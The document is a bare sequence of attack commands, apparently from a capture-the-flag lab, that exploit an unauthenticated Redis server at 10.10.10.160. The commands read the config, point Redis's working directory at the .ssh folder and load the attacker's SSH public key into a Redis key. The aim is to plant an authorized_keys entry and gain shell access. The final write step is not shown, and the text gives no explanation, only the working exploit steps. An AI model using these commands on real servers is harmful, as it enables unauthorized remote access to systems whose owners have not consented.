```GET CONFIG *```

```CONFIG get dir /var/lib/redis```

```CONFIG set dir /var/lib/redis/.ssh```

```
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key

```
